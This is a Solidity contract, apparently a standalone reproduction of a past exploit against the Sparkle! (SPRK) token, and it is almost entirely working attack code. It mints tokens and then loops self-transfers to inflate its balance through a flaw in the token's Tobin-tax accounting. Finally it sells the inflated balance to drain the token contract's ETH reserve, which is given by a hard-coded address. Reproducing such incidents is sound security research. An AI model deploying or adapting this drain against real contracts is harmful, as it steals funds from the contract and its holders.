// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Standalone playground exploit for Sparkle! (SPRK) Tobin-tax self-transfer
// inflation. Mirrors registry test/SPRK_exp.sol::testExploit without forge-std
// cheatcodes / BaseTestWithBalanceLog.

interface ISPRK {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function sellSparkle(uint256 amount) external returns (bool);
    function mintSparkle() external payable returns (bool);
}

address constant SPRK_TOKEN = 0x286ae10228C274a9396a05A56B9E3B8f42D1cE14;

contract SPRKDrain {
    /// @dev Fund this contract with enough ETH (setup fundAttackerWei / value)
    /// before calling. Mirrors the Foundry test's deal(20 ether) then mint 5 ETH.
    function testExploit() external payable {
        // 1) Seed position via fixed-price mint
        ISPRK(SPRK_TOKEN).mintSparkle{value: 5 ether}();

        // 2) Self-transfer loop: each non-zero transfer double-applies unclaimed
        //    Tobin share (tax is added to _tobinsCollected AFTER _tobinsClaimed is
        //    written, so residual unclaimed remains). Zero-transfer realizes state
        //    like the live attack.
        for (uint256 i; i < 55; i++) {
            uint256 b = ISPRK(SPRK_TOKEN).balanceOf(address(this));
            uint256 amt = (b * 100) / 102;
            ISPRK(SPRK_TOKEN).transfer(address(this), amt);
            ISPRK(SPRK_TOKEN).transfer(address(this), 0);
        }

        uint256 inflated = ISPRK(SPRK_TOKEN).balanceOf(address(this));

        // 3) Redeem against ETH reserve at fixed COST_PER_TOKEN; leave headroom
        //    for the 3% creator fee on sell path.
        uint256 maxByEth = (SPRK_TOKEN.balance * 95) / 100 * 1e4;
        uint256 sellAmt = inflated > maxByEth ? maxByEth : inflated;
        ISPRK(SPRK_TOKEN).sellSparkle(sellAmt);
    }

    receive() external payable {}
}
